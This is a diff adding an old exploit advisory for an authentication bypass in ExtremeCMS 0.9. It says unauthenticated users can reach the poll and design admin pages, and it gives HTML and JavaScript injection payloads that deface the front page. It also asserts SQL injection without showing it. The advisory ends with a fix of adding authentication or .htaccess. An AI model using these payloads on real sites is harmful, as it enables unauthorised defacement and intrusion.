@@ -1,0 +1,34 @@
+#####################################################################################
+#           ExtremeCMS 0.9 Poll Administration Authentication Bypass                #
+#####################################################################################
+#                                                                                   #
+# Software: ExtremeCMS 0.9                                                          #
+#                                                                                   #
+# Vendor: http://www.extremecms.net/                                                #
+#                                                                                   #
+# Released: 2006/11/14                                                              #
+#                                                                                   #
+# Discovered By: r0ut3r (writ3r [at] gmail.com)                                     #
+#                                                                                   #
+# Criticality: Moderately critical (Allows addition of data on front page, or any   #
+# page the poll is viewed)                                                          #
+#                                                                                   #
+#####################################################################################
+
+With the below vulnerabilities it is possible to add information to the main pages, and alter the layout, as well as preform SQL injection.
+
+extremeCMS Ability to modify poll aministration & preform SQL injection
+without logging in you can access:
+admin/options.php
+
+poc: put this into the text field:
+"><h1>HACKED</h1>
+Even better, clear the page with javascript, then write to the page!
+<script>document.clear(document.write("pwned"));</script>
+
+Add stuff to the title, and to the body text - this CMS is comical.
+admin/listdesign.php
+
+Note: This information is displayed on the front page
+
+Fix, add some authentication. In the mean time use .htaccess in the admin/ directory. For .htaccess demo view bottom of http://milw0rm.com/exploits/2768
